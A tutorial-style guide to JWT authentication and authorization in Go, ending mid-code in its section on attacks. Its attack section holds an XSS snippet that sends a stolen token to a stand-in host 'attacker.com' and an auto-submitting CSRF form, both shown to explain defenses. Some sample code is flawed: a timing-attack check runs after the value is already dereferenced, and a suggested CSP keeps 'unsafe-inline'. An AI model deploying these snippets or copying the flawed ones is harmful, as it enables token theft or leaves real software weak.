# JWT Authentication & Authorization: Complete Guide
**From Basic to Advanced - A University Course Approach**

---

## Table of Contents
1. [Foundation Concepts](#1-foundation-concepts)
2. [JWT Structure & Mechanics](#2-jwt-structure--mechanics)
3. [Basic Implementation](#3-basic-implementation)
4. [Authentication Scenarios](#4-authentication-scenarios)
5. [Advanced Security Patterns](#5-advanced-security-patterns)
6. [Production Best Practices](#6-production-best-practices)
7. [Common Attack Vectors](#7-common-attack-vectors)

---

## 1. Foundation Concepts

### 1.1 Authentication vs Authorization

**Authentication**: *"Who are you?"*
- Verifying user identity
- Login credentials validation
- Multi-factor verification

**Authorization**: *"What can you do?"*
- Permission checking
- Role-based access control (RBAC)
- Resource-level permissions

### 1.2 Session-Based vs Token-Based Authentication

| Aspect | Session-Based | Token-Based (JWT) |
|--------|---------------|-------------------|
| Storage | Server memory/DB | Client-side |
| Scalability | Requires sticky sessions | Stateless, scales easily |
| Cross-domain | Complex (CORS issues) | Simple |
| Revocation | Immediate | Requires token blacklist |
| Bandwidth | Small cookie | Larger token |

### 1.3 When to Use JWT

✅ **Good Use Cases:**
- Microservices architecture
- Mobile applications
- Single Page Applications (SPAs)
- Cross-domain authentication
- Stateless APIs

❌ **Poor Use Cases:**
- Traditional server-rendered apps (sessions better)
- Instant revocation required
- Highly sensitive financial transactions

---

## 2. JWT Structure & Mechanics

### 2.1 Anatomy of a JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Structure**: `HEADER.PAYLOAD.SIGNATURE`

#### Header (Base64URL encoded)
```json
{
  "alg": "HS256",      // Algorithm (HMAC SHA256)
  "typ": "JWT"         // Token type
}
```

#### Payload (Base64URL encoded)
```json
{
  "sub": "1234567890",           // Subject (user ID)
  "name": "John Doe",            // Custom claims
  "iat": 1516239022,             // Issued at
  "exp": 1516242622,             // Expiration
  "roles": ["user", "admin"]     // Custom claims
}
```

#### Signature
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### 2.2 Standard Claims (RFC 7519)

| Claim | Name | Description |
|-------|------|-------------|
| `iss` | Issuer | Who created the token |
| `sub` | Subject | User identifier (unique) |
| `aud` | Audience | Intended recipient |
| `exp` | Expiration | Unix timestamp |
| `nbf` | Not Before | Token not valid before |
| `iat` | Issued At | Creation timestamp |
| `jti` | JWT ID | Unique token identifier |

### 2.3 Signing Algorithms

**Symmetric (Shared Secret)**
- HS256, HS384, HS512
- Same key for signing and verification
- Faster, simpler
- Best for: Internal services

**Asymmetric (Public/Private Key)**
- RS256, RS384, RS512 (RSA)
- ES256, ES384, ES512 (ECDSA)
- Different keys for signing vs verification
- Best for: Public APIs, third-party integrations

```go
// Example: HS256 vs RS256
// HS256 - Symmetric
token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
tokenString, _ := token.SignedString([]byte("secret-key"))

// RS256 - Asymmetric
token := jwt.NewWithClaims(jwt.SigningMethodRS256, claims)
tokenString, _ := token.SignedString(privateKey)
```

---

## 3. Basic Implementation

### 3.1 Token Generation (Login)

```go
package auth

import (
    "time"
    "github.com/golang-jwt/jwt/v5"
)

type Claims struct {
    UserID   string   `json:"user_id"`
    Email    string   `json:"email"`
    Roles    []string `json:"roles"`
    jwt.RegisteredClaims
}

func GenerateToken(userID, email string, roles []string, secret string) (string, error) {
    claims := Claims{
        UserID: userID,
        Email:  email,
        Roles:  roles,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(15 * time.Minute)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            NotBefore: jwt.NewNumericDate(time.Now()),
            Issuer:    "cinema-platform",
            Subject:   userID,
        },
    }

    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString([]byte(secret))
}
```

### 3.2 Token Validation (Middleware)

```go
func ValidateToken(tokenString, secret string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {
        // Verify signing algorithm
        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
            return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
        }
        return []byte(secret), nil
    })

    if err != nil {
        return nil, err
    }

    if claims, ok := token.Claims.(*Claims); ok && token.Valid {
        return claims, nil
    }

    return nil, fmt.Errorf("invalid token")
}

// HTTP Middleware Example
func AuthMiddleware(secret string) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            authHeader := r.Header.Get("Authorization")
            if authHeader == "" {
                http.Error(w, "Missing authorization header", http.StatusUnauthorized)
                return
            }

            // Extract token from "Bearer <token>"
            tokenString := strings.TrimPrefix(authHeader, "Bearer ")
            
            claims, err := ValidateToken(tokenString, secret)
            if err != nil {
                http.Error(w, "Invalid token", http.StatusUnauthorized)
                return
            }

            // Add claims to request context
            ctx := context.WithValue(r.Context(), "user_claims", claims)
            next.ServeHTTP(w, r.WithContext(ctx))
        })
    }
}
```

### 3.3 Extracting User from Context

```go
func GetUserFromContext(ctx context.Context) (*Claims, error) {
    claims, ok := ctx.Value("user_claims").(*Claims)
    if !ok {
        return nil, fmt.Errorf("no user claims in context")
    }
    return claims, nil
}

// Usage in handler
func ProfileHandler(w http.ResponseWriter, r *http.Request) {
    claims, err := GetUserFromContext(r.Context())
    if err != nil {
        http.Error(w, "Unauthorized", http.StatusUnauthorized)
        return
    }
    
    fmt.Fprintf(w, "Hello, %s (ID: %s)", claims.Email, claims.UserID)
}
```

---

## 4. Authentication Scenarios

### 4.1 Login (Initial Authentication)

**Flow:**
1. User submits credentials
2. Server validates credentials
3. Generate access + refresh tokens
4. Return tokens to client

```go
type LoginRequest struct {
    Email    string `json:"email"`
    Password string `json:"password"`
}

type LoginResponse struct {
    AccessToken  string `json:"access_token"`
    RefreshToken string `json:"refresh_token"`
    ExpiresIn    int64  `json:"expires_in"`
}

func (s *AuthService) Login(req LoginRequest) (*LoginResponse, error) {
    // 1. Validate credentials
    user, err := s.userRepo.FindByEmail(req.Email)
    if err != nil {
        return nil, ErrInvalidCredentials
    }

    if !s.passwordHasher.Compare(user.PasswordHash, req.Password) {
        return nil, ErrInvalidCredentials
    }

    // 2. Generate tokens
    accessToken, err := GenerateToken(
        user.ID,
        user.Email,
        user.Roles,
        s.config.JWTSecret,
    )
    if err != nil {
        return nil, err
    }

    refreshToken, err := s.generateRefreshToken(user.ID)
    if err != nil {
        return nil, err
    }

    // 3. Store refresh token (DB or Redis)
    err = s.tokenRepo.SaveRefreshToken(user.ID, refreshToken, 7*24*time.Hour)
    if err != nil {
        return nil, err
    }

    return &LoginResponse{
        AccessToken:  accessToken,
        RefreshToken: refreshToken,
        ExpiresIn:    900, // 15 minutes
    }, nil
}
```

### 4.2 Logout (Token Invalidation)

**Challenge**: JWTs are stateless - can't be invalidated before expiry

**Solution Approaches:**

#### Approach 1: Token Blacklist (Redis)
```go
func (s *AuthService) Logout(accessToken, refreshToken string) error {
    claims, _ := ValidateToken(accessToken, s.config.JWTSecret)
    
    // Calculate remaining TTL
    ttl := time.Until(claims.ExpiresAt.Time)
    
    // Add to blacklist
    err := s.redis.Set(
        context.Background(),
        fmt.Sprintf("blacklist:%s", claims.ID), // Use jti claim
        "revoked",
        ttl,
    ).Err()
    
    if err != nil {
        return err
    }
    
    // Delete refresh token
    return s.tokenRepo.DeleteRefreshToken(refreshToken)
}

// Middleware check
func (s *AuthService) IsTokenBlacklisted(jti string) bool {
    result := s.redis.Get(context.Background(), fmt.Sprintf("blacklist:%s", jti))
    return result.Err() == nil
}
```

#### Approach 2: Short-Lived Tokens + Refresh
```go
// Access token: 15 minutes (no revocation needed, expires quickly)
// Refresh token: 7 days (stored in DB, can be revoked)

func (s *AuthService) Logout(refreshToken string) error {
    // Only revoke refresh token
    return s.tokenRepo.DeleteRefreshToken(refreshToken)
}
```

### 4.3 Token Refresh

```go
type RefreshRequest struct {
    RefreshToken string `json:"refresh_token"`
}

func (s *AuthService) RefreshToken(req RefreshRequest) (*LoginResponse, error) {
    // 1. Validate refresh token exists in DB
    storedToken, err := s.tokenRepo.GetRefreshToken(req.RefreshToken)
    if err != nil {
        return nil, ErrInvalidRefreshToken
    }

    // 2. Check expiration
    if storedToken.ExpiresAt.Before(time.Now()) {
        s.tokenRepo.DeleteRefreshToken(req.RefreshToken)
        return nil, ErrRefreshTokenExpired
    }

    // 3. Get user
    user, err := s.userRepo.FindByID(storedToken.UserID)
    if err != nil {
        return nil, err
    }

    // 4. Generate new access token
    accessToken, err := GenerateToken(
        user.ID,
        user.Email,
        user.Roles,
        s.config.JWTSecret,
    )
    if err != nil {
        return nil, err
    }

    // 5. Optional: Rotate refresh token
    newRefreshToken, err := s.generateRefreshToken(user.ID)
    if err != nil {
        return nil, err
    }

    // Delete old, save new
    s.tokenRepo.DeleteRefreshToken(req.RefreshToken)
    s.tokenRepo.SaveRefreshToken(user.ID, newRefreshToken, 7*24*time.Hour)

    return &LoginResponse{
        AccessToken:  accessToken,
        RefreshToken: newRefreshToken,
        ExpiresIn:    900,
    }, nil
}
```

### 4.4 Remember Me

**Implementation Strategy:**

```go
type LoginRequest struct {
    Email      string `json:"email"`
    Password   string `json:"password"`
    RememberMe bool   `json:"remember_me"`
}

func (s *AuthService) Login(req LoginRequest) (*LoginResponse, error) {
    // ... validate credentials ...

    // Adjust token expiry based on RememberMe
    var refreshExpiry time.Duration
    if req.RememberMe {
        refreshExpiry = 30 * 24 * time.Hour // 30 days
    } else {
        refreshExpiry = 7 * 24 * time.Hour  // 7 days
    }

    refreshToken, _ := s.generateRefreshToken(user.ID)
    s.tokenRepo.SaveRefreshToken(user.ID, refreshToken, refreshExpiry)

    // ... return tokens ...
}
```

**Client-Side Storage:**
```javascript
// Without Remember Me: sessionStorage (cleared on tab close)
sessionStorage.setItem('access_token', response.access_token);
sessionStorage.setItem('refresh_token', response.refresh_token);

// With Remember Me: localStorage (persists)
localStorage.setItem('access_token', response.access_token);
localStorage.setItem('refresh_token', response.refresh_token);

// Secure alternative: HttpOnly cookies (best for web apps)
// Set-Cookie: refresh_token=...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
```

### 4.5 Password Reset

**Complete Flow:**

```go
// Step 1: Request Password Reset
func (s *AuthService) RequestPasswordReset(email string) error {
    user, err := s.userRepo.FindByEmail(email)
    if err != nil {
        // Don't reveal if email exists (security)
        return nil
    }

    // Generate reset token (NOT a JWT, use crypto/rand)
    resetToken := generateSecureToken(32)
    
    // Store with expiration (15-30 minutes)
    err = s.tokenRepo.SavePasswordResetToken(
        user.ID,
        resetToken,
        30*time.Minute,
    )
    if err != nil {
        return err
    }

    // Send email
    resetLink := fmt.Sprintf("https://app.com/reset-password?token=%s", resetToken)
    s.emailService.SendPasswordReset(user.Email, resetLink)

    return nil
}

// Step 2: Verify Reset Token
func (s *AuthService) VerifyResetToken(token string) (*User, error) {
    resetData, err := s.tokenRepo.GetPasswordResetToken(token)
    if err != nil {
        return nil, ErrInvalidResetToken
    }

    if resetData.ExpiresAt.Before(time.Now()) {
        s.tokenRepo.DeletePasswordResetToken(token)
        return nil, ErrResetTokenExpired
    }

    user, err := s.userRepo.FindByID(resetData.UserID)
    return user, err
}

// Step 3: Reset Password
func (s *AuthService) ResetPassword(token, newPassword string) error {
    user, err := s.VerifyResetToken(token)
    if err != nil {
        return err
    }

    // Hash new password
    hashedPassword, _ := s.passwordHasher.Hash(newPassword)
    
    // Update password
    err = s.userRepo.UpdatePassword(user.ID, hashedPassword)
    if err != nil {
        return err
    }

    // Delete reset token
    s.tokenRepo.DeletePasswordResetToken(token)

    // Revoke all existing refresh tokens (force re-login)
    s.tokenRepo.DeleteAllRefreshTokensForUser(user.ID)

    // Optional: Send confirmation email
    s.emailService.SendPasswordChanged(user.Email)

    return nil
}

func generateSecureToken(length int) string {
    b := make([]byte, length)
    rand.Read(b)
    return base64.URLEncoding.EncodeToString(b)
}
```

### 4.6 Email Verification

```go
func (s *AuthService) SendVerificationEmail(userID string) error {
    user, _ := s.userRepo.FindByID(userID)
    
    // Generate verification token
    verifyToken := generateSecureToken(32)
    
    s.tokenRepo.SaveEmailVerificationToken(
        userID,
        verifyToken,
        24*time.Hour, // 24 hours to verify
    )

    verifyLink := fmt.Sprintf("https://app.com/verify-email?token=%s", verifyToken)
    s.emailService.SendEmailVerification(user.Email, verifyLink)

    return nil
}

func (s *AuthService) VerifyEmail(token string) error {
    verifyData, err := s.tokenRepo.GetEmailVerificationToken(token)
    if err != nil {
        return ErrInvalidVerificationToken
    }

    // Mark user as verified
    err = s.userRepo.MarkEmailAsVerified(verifyData.UserID)
    if err != nil {
        return err
    }

    s.tokenRepo.DeleteEmailVerificationToken(token)
    return nil
}
```

### 4.7 Multi-Factor Authentication (MFA)

```go
// Step 1: Generate MFA Secret (TOTP)
func (s *AuthService) EnableMFA(userID string) (*MFASetup, error) {
    secret := generateTOTPSecret()
    
    // Generate QR code for authenticator app
    qrCode := generateQRCode(secret, "Cinema Platform", userID)
    
    // Store secret (encrypted)
    s.userRepo.SaveMFASecret(userID, encrypt(secret))
    
    return &MFASetup{
        Secret: secret,
        QRCode: qrCode,
    }, nil
}

// Step 2: Modified Login Flow
func (s *AuthService) Login(req LoginRequest) (*LoginResponse, error) {
    // Validate credentials first
    user, err := s.userRepo.FindByEmail(req.Email)
    if err != nil {
        return nil, ErrInvalidCredentials
    }

    if !s.passwordHasher.Compare(user.PasswordHash, req.Password) {
        return nil, ErrInvalidCredentials
    }

    // Check if MFA enabled
    if user.MFAEnabled {
        // Issue temporary token (5 minutes)
        tempToken, _ := s.generateTempMFAToken(user.ID)
        
        return &LoginResponse{
            RequiresMFA: true,
            TempToken:   tempToken,
        }, nil
    }

    // Normal token generation
    return s.generateAuthTokens(user)
}

// Step 3: MFA Verification
func (s *AuthService) VerifyMFA(tempToken, mfaCode string) (*LoginResponse, error) {
    claims, err := ValidateToken(tempToken, s.config.JWTSecret)
    if err != nil {
        return nil, err
    }

    user, _ := s.userRepo.FindByID(claims.UserID)
    
    // Verify TOTP code
    secret := decrypt(user.MFASecret)
    if !verifyTOTPCode(secret, mfaCode) {
        return nil, ErrInvalidMFACode
    }

    // Issue full access tokens
    return s.generateAuthTokens(user)
}
```

---

## 5. Advanced Security Patterns

### 5.1 Token Rotation (Refresh Token Rotation)

```go
// Automatic rotation on every refresh
func (s *AuthService) RefreshToken(oldRefreshToken string) (*LoginResponse, error) {
    storedToken, err := s.tokenRepo.GetRefreshToken(oldRefreshToken)
    if err != nil {
        // Check if token was recently rotated (reuse detection)
        if s.isTokenRecentlyRotated(oldRefreshToken) {
            // Possible token theft - revoke all tokens for user
            s.revokeAllUserTokens(storedToken.UserID)
            return nil, ErrSuspiciousActivity
        }
        return nil, ErrInvalidRefreshToken
    }

    user, _ := s.userRepo.FindByID(storedToken.UserID)

    // Generate new tokens
    newAccessToken, _ := GenerateToken(user.ID, user.Email, user.Roles, s.config.JWTSecret)
    newRefreshToken, _ := s.generateRefreshToken(user.ID)

    // Atomic swap: delete old, save new
    tx := s.db.Begin()
    s.tokenRepo.DeleteRefreshToken(oldRefreshToken, tx)
    s.tokenRepo.SaveRefreshToken(user.ID, newRefreshToken, 7*24*time.Hour, tx)
    s.tokenRepo.MarkTokenAsRotated(oldRefreshToken, 1*time.Hour, tx) // For reuse detection
    tx.Commit()

    return &LoginResponse{
        AccessToken:  newAccessToken,
        RefreshToken: newRefreshToken,
        ExpiresIn:    900,
    }, nil
}
```

### 5.2 Token Binding (Device Fingerprinting)

```go
type DeviceInfo struct {
    UserAgent string
    IPAddress string
    DeviceID  string // Generated client-side
}

func (s *AuthService) Login(req LoginRequest, device DeviceInfo) (*LoginResponse, error) {
    // ... validate credentials ...

    // Create fingerprint
Fingerprint := generateFingerprint(device)
    
    // Include in refresh token claims
    refreshClaims := Claims{
        UserID:            user.ID,
        DeviceFingerprint: fingerprint,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(7 * 24 * time.Hour)),
        },
    }

    refreshToken, _ := jwt.NewWithClaims(jwt.SigningMethodHS256, refreshClaims).SignedString([]byte(s.config.RefreshSecret))
    
    // Store device info
    s.deviceRepo.SaveDevice(user.ID, device)

    return &LoginResponse{
        AccessToken:  accessToken,
        RefreshToken: refreshToken,
    }, nil
}

func (s *AuthService) RefreshToken(refreshToken string, device DeviceInfo) (*LoginResponse, error) {
    claims, _ := ValidateToken(refreshToken, s.config.RefreshSecret)
    
    // Verify device fingerprint
    currentFingerprint := generateFingerprint(device)
    if claims.DeviceFingerprint != currentFingerprint {
        return nil, ErrDeviceMismatch
    }

    // Continue refresh...
}

func generateFingerprint(device DeviceInfo) string {
    data := fmt.Sprintf("%s:%s:%s", device.UserAgent, device.IPAddress, device.DeviceID)
    hash := sha256.Sum256([]byte(data))
    return hex.EncodeToString(hash[:])
}
```

### 5.3 Scope-Based Authorization

```go
type Claims struct {
    UserID string   `json:"user_id"`
    Scopes []string `json:"scopes"` // e.g., ["read:profile", "write:posts", "admin:users"]
    jwt.RegisteredClaims
}

// Middleware to check scopes
func RequireScopes(requiredScopes ...string) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            claims, _ := GetUserFromContext(r.Context())
            
            for _, required := range requiredScopes {
                if !contains(claims.Scopes, required) {
                    http.Error(w, "Insufficient permissions", http.StatusForbidden)
                    return
                }
            }
            
            next.ServeHTTP(w, r)
        })
    }
}

// Usage
router.Handle("/api/admin/users",
    RequireScopes("admin:users")(http.HandlerFunc(AdminUsersHandler)))

router.Handle("/api/posts",
    RequireScopes("write:posts")(http.HandlerFunc(CreatePostHandler)))
```

### 5.4 Rate Limiting & Brute Force Protection

```go
func (s *AuthService) Login(req LoginRequest) (*LoginResponse, error) {
    // Check rate limit
    key := fmt.Sprintf("login_attempts:%s", req.Email)
    attempts, _ := s.redis.Get(context.Background(), key).Int()
    
    if attempts >= 5 {
        // Check lockout duration
        ttl, _ := s.redis.TTL(context.Background(), key).Result()
        return nil, fmt.Errorf("too many attempts, try again in %v", ttl)
    }

    // Validate credentials
    user, err := s.userRepo.FindByEmail(req.Email)
    if err != nil || !s.passwordHasher.Compare(user.PasswordHash, req.Password) {
        // Increment attempts
        s.redis.Incr(context.Background(), key)
        s.redis.Expire(context.Background(), key, 15*time.Minute)
        
        return nil, ErrInvalidCredentials
    }

    // Successful login - reset attempts
    s.redis.Del(context.Background(), key)

    // Generate tokens...
}
```

### 5.5 Audience & Issuer Validation

```go
func ValidateToken(tokenString string, config TokenConfig) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {
        return []byte(config.Secret), nil
    }, jwt.WithValidMethods([]string{"HS256"}))

    if err != nil {
        return nil, err
    }

    claims, ok := token.Claims.(*Claims)
    if !ok || !token.Valid {
        return nil, ErrInvalidToken
    }

    // Validate issuer
    if claims.Issuer != config.ExpectedIssuer {
        return nil, fmt.Errorf("invalid issuer: %s", claims.Issuer)
    }

    // Validate audience
    if !claims.VerifyAudience(config.ExpectedAudience, true) {
        return nil, fmt.Errorf("invalid audience")
    }

    return claims, nil
}

// Usage
config := TokenConfig{
    Secret:           "my-secret",
    ExpectedIssuer:   "cinema-platform",
    ExpectedAudience: "cinema-api",
}

claims, err := ValidateToken(tokenString, config)
```

### 5.6 Concurrent Session Management

```go
// Limit active sessions per user
func (s *AuthService) Login(req LoginRequest) (*LoginResponse, error) {
    // ... validate credentials ...

    // Check active sessions
    activeSessions, _ := s.sessionRepo.GetActiveSessionsCount(user.ID)
    
    if activeSessions >= s.config.MaxSessionsPerUser {
        // Revoke oldest session
        s.sessionRepo.RevokeOldestSession(user.ID)
    }

    // Create new session
    sessionID := uuid.New().String()
    accessToken, _ := GenerateToken(user.ID, user.Email, user.Roles, s.config.JWTSecret)
    refreshToken, _ := s.generateRefreshToken(user.ID)

    // Store session metadata
    s.sessionRepo.CreateSession(Session{
        ID:           sessionID,
        UserID:       user.ID,
        RefreshToken: refreshToken,
        IPAddress:    req.IPAddress,
        UserAgent:    req.UserAgent,
        CreatedAt:    time.Now(),
        LastActiveAt: time.Now(),
    })

    return &LoginResponse{
        AccessToken:  accessToken,
        RefreshToken: refreshToken,
        SessionID:    sessionID,
    }, nil
}

// List active sessions
func (s *AuthService) GetActiveSessions(userID string) ([]Session, error) {
    return s.sessionRepo.GetActiveSessionsByUserID(userID)
}

// Revoke specific session
func (s *AuthService) RevokeSession(userID, sessionID string) error {
    session, _ := s.sessionRepo.GetSession(sessionID)
    
    if session.UserID != userID {
        return ErrUnauthorized
    }

    // Delete refresh token
    s.tokenRepo.DeleteRefreshToken(session.RefreshToken)
    
    // Delete session
    return s.sessionRepo.DeleteSession(sessionID)
}
```

---

## 6. Production Best Practices

### 6.1 Secure Token Storage

**Client-Side Options:**

| Storage | Security | XSS Vulnerable | CSRF Vulnerable | Use Case |
|---------|----------|----------------|-----------------|----------|
| localStorage | ❌ Low | ✅ Yes | ❌ No | SPAs (with precautions) |
| sessionStorage | ❌ Low | ✅ Yes | ❌ No | Temporary sessions |
| Memory (JS variable) | ⚠️ Medium | ✅ Yes | ❌ No | High security SPAs |
| HttpOnly Cookie | ✅ High | ❌ No | ✅ Yes (use SameSite) | **Recommended** |

**Recommended: HttpOnly Cookies**

```go
func (s *AuthService) SetAuthCookies(w http.ResponseWriter, tokens *LoginResponse) {
    // Access token (short-lived, can be in memory or cookie)
    http.SetCookie(w, &http.Cookie{
        Name:     "access_token",
        Value:    tokens.AccessToken,
        Path:     "/",
        MaxAge:   900, // 15 minutes
        HttpOnly: true,
        Secure:   true, // HTTPS only
        SameSite: http.SameSiteStrictMode,
    })

    // Refresh token (HttpOnly, long-lived)
    http.SetCookie(w, &http.Cookie{
        Name:     "refresh_token",
        Value:    tokens.RefreshToken,
        Path:     "/api/auth/refresh", // Restricted path
        MaxAge:   604800, // 7 days
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteStrictMode,
    })
}

// Middleware to extract token from cookie
func AuthMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        cookie, err := r.Cookie("access_token")
        if err != nil {
            http.Error(w, "Missing token", http.StatusUnauthorized)
            return
        }

        claims, err := ValidateToken(cookie.Value, config.Secret)
        if err != nil {
            http.Error(w, "Invalid token", http.StatusUnauthorized)
            return
        }

        ctx := context.WithValue(r.Context(), "user_claims", claims)
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}
```

### 6.2 Token Expiry Strategy

```go
type TokenConfig struct {
    AccessTokenTTL  time.Duration // 15 minutes
    RefreshTokenTTL time.Duration // 7 days
    
    // For high-security operations
    ShortLivedTokenTTL time.Duration // 5 minutes
}

// Different token types for different sensitivity
func (s *AuthService) GenerateAccessToken(user *User, tokenType string) (string, error) {
    var expiry time.Duration
    
    switch tokenType {
    case "standard":
        expiry = s.config.AccessTokenTTL
    case "high_security":
        expiry = s.config.ShortLivedTokenTTL
    case "mfa_temp":
        expiry = 5 * time.Minute
    }

    claims := Claims{
        UserID: user.ID,
        Type:   tokenType,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(expiry)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
        },
    }

    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString([]byte(s.config.JWTSecret))
}
```

### 6.3 Secret Management

```go
// DO NOT hardcode secrets
// ❌ Bad
const JWTSecret = "my-secret-key"

// ✅ Good: Use environment variables
import "os"

type Config struct {
    JWTSecret        string
    RefreshSecret    string
    EncryptionKey    string
}

func LoadConfig() *Config {
    return &Config{
        JWTSecret:     os.Getenv("JWT_SECRET"),
        RefreshSecret: os.Getenv("REFRESH_SECRET"),
        EncryptionKey: os.Getenv("ENCRYPTION_KEY"),
    }
}

// ✅ Best: Use secret management services
// - AWS Secrets Manager
// - HashiCorp Vault
// - Azure Key Vault
// - Google Secret Manager

import (
    "github.com/aws/aws-sdk-go/aws/session"
    "github.com/aws/aws-sdk-go/service/secretsmanager"
)

func GetSecretFromAWS(secretName string) (string, error) {
    sess := session.Must(session.NewSession())
    svc := secretsmanager.New(sess)

    result, err := svc.GetSecretValue(&secretsmanager.GetSecretValueInput{
        SecretId: &secretName,
    })
    if err != nil {
        return "", err
    }

    return *result.SecretString, nil
}
```

### 6.4 Logging & Monitoring

```go
type AuthEvent struct {
    EventType string    `json:"event_type"`
    UserID    string    `json:"user_id"`
    Email     string    `json:"email"`
    IPAddress string    `json:"ip_address"`
    UserAgent string    `json:"user_agent"`
    Success   bool      `json:"success"`
    Reason    string    `json:"reason,omitempty"`
    Timestamp time.Time `json:"timestamp"`
}

func (s *AuthService) LogAuthEvent(event AuthEvent) {
    // Log to structured logger (JSON)
    s.logger.Info("auth_event",
        zap.String("event_type", event.EventType),
        zap.String("user_id", event.UserID),
        zap.String("ip_address", event.IPAddress),
        zap.Bool("success", event.Success),
    )

    // Send to metrics/monitoring
    s.metrics.IncCounter("auth_attempts", map[string]string{
        "event_type": event.EventType,
        "success":    fmt.Sprintf("%t", event.Success),
    })

    // Alert on suspicious activity
    if event.EventType == "failed_login" {
        s.checkForBruteForce(event.Email, event.IPAddress)
    }
}

// Security monitoring
func (s *AuthService) checkForBruteForce(email, ip string) {
    key := fmt.Sprintf("failed_login:%s:%s", email, ip)
    count, _ := s.redis.Incr(context.Background(), key).Result()
    s.redis.Expire(context.Background(), key, 1*time.Hour)

    if count > 10 {
        // Alert security team
        s.alertService.SendSecurityAlert(fmt.Sprintf(
            "Possible brute force attack: %d failed attempts for %s from %s",
            count, email, ip,
        ))
    }
}
```

### 6.5 Error Handling (Security-Aware)

```go
// ❌ Bad: Reveals user existence
func (s *AuthService) Login(req LoginRequest) error {
    user, err := s.userRepo.FindByEmail(req.Email)
    if err != nil {
        return fmt.Errorf("user not found")
    }
    
    if !s.passwordHasher.Compare(user.PasswordHash, req.Password) {
        return fmt.Errorf("incorrect password")
    }
}

// ✅ Good: Generic error message
func (s *AuthService) Login(req LoginRequest) (*LoginResponse, error) {
    user, err := s.userRepo.FindByEmail(req.Email)
    if err != nil {
        return nil, ErrInvalidCredentials // Generic error
    }
    
    if !s.passwordHasher.Compare(user.PasswordHash, req.Password) {
        return nil, ErrInvalidCredentials // Same error
    }

    // Always hash password even if user not found (timing attack prevention)
    if user == nil {
        s.passwordHasher.Hash(req.Password) // Dummy hash
        return nil, ErrInvalidCredentials
    }

    // Generate tokens...
}

// Standard errors
var (
    ErrInvalidCredentials     = errors.New("invalid email or password")
    ErrInvalidToken           = errors.New("invalid or expired token")
    ErrUnauthorized           = errors.New("unauthorized")
    ErrInsufficientPermissions = errors.New("insufficient permissions")
)
```

---

## 7. Common Attack Vectors

### 7.1 XSS (Cross-Site Scripting)

**Attack:**
```javascript
// Attacker injects malicious script
<script>
  const token = localStorage.getItem('access_token');
  fetch('https://attacker.com/steal', { 
    method: 'POST', 
    body: JSON.stringify({ token }) 
  });
</script>
```

**Defense:**
1. **HttpOnly Cookies** (cannot be accessed via JavaScript)
2. **Content Security Policy (CSP)**
```go
w.Header().Set("Content-Security-Policy", 
    "default-src 'self'; script-src 'self' 'unsafe-inline'")
```
3. **Sanitize user input**
4. **Escape output**

### 7.2 CSRF (Cross-Site Request Forgery)

**Attack:**
```html
<!-- Attacker's site -->
<form action="https://cinema-platform.com/api/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**Defense:**
```go
// 1. SameSite cookies
http.SetCookie(w, &http.Cookie{
    Name:     "access_token",
    Value:    token,
    SameSite: http.SameSiteStrictMode, // or Lax
    HttpOnly: true,
    Secure:   true,
})

// 2. CSRF tokens
func GenerateCSRFToken(sessionID string, secret string) string {
    h := hmac.New(sha256.New, []byte(secret))
    h.Write([]byte(sessionID))
    return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

func ValidateCSRFToken(sessionID, token, secret string) bool {
    expected := GenerateCSRFToken(sessionID, secret)
    return hmac.Equal([]byte(expected), []byte(token))
}

// Middleware
func CSRFMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method == "POST" || r.Method == "PUT" || r.Method == "DELETE" {
            csrfToken := r.Header.Get("X-CSRF-Token")
            sessionID := getSessionID(r)
            
            if !ValidateCSRFToken(sessionID, csrfToken, config.CSRFSecret) {
                http.Error(w, "Invalid CSRF token", http.StatusForbidden)
                return
            }
        }
        next.ServeHTTP(w, r)
    })
}
```

### 7.3 Token Replay Attacks

**Attack:** Attacker intercepts and reuses valid token

**Defense:**
```go
// 1. Short token expiry
claims.ExpiresAt = jwt.NewNumericDate(time.Now().Add(15 * time.Minute))

// 2. One-time use tokens (for sensitive operations)
type OneTimeToken struct {
    JTI    string `json:"jti"` // Unique token ID
    Used   bool   `json:"-"`
    UserID string `json:"user_id"`
}

func (s *AuthService) ValidateOneTimeToken(tokenString string) (*Claims, error) {
    claims, err := ValidateToken(tokenString, s.config.Secret)
    if err != nil {
        return nil, err
    }

    // Check if already used
    key := fmt.Sprintf("used_token:%s", claims.ID)
    exists := s.redis.Exists(context.Background(), key).Val()
    
    if exists == 1 {
        return nil, ErrTokenAlreadyUsed
